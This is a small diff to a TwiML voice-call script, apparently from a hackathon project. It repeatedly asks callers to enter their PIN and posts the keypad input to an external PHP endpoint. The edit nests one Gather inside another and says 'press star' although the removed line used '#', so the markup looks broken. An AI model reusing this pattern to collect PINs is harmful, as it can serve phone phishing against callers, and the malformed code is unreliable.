@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <Response>
-    <Gather timeout="100000" numDigits="1" action="http://kanpurdeals.com/ohack/index.php" finishOnKey="#">
+    <Gather action="http://kanpurdeals.com/ohack/index.php" method="POST">
+        <Gather timeout="100">
         <Say> Please ......................... enter your pin number and then press star. Please enter your pin number and then press star. Please enter your pin number and then press star..............................................</Say>
+        </Gather>
     </Gather>
 </Response>
